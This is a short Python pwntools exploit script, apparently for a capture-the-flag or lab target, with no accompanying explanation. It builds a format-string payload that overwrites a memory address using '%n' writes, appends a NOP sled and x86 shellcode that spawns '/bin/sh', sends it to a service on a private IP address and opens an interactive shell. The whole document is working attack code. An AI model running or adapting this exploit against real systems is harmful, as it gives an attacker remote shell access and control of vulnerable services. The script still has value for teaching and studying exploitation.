from pwn import *

tar_p1 = struct.pack('I', 0x08049724)
tar_p2 = struct.pack('I', 0x08049724 + 0x2)

buf = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69'
buf += '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

payload = tar_p1 + tar_p2

# 0xbffff5ee

payload += '%62950d' + '%4$n'
payload += '%51729d' + '%5$n'

payload += nop + buf

r = remote('192.168.122.87', 4444)
r.sendline(payload)

r.interactive()
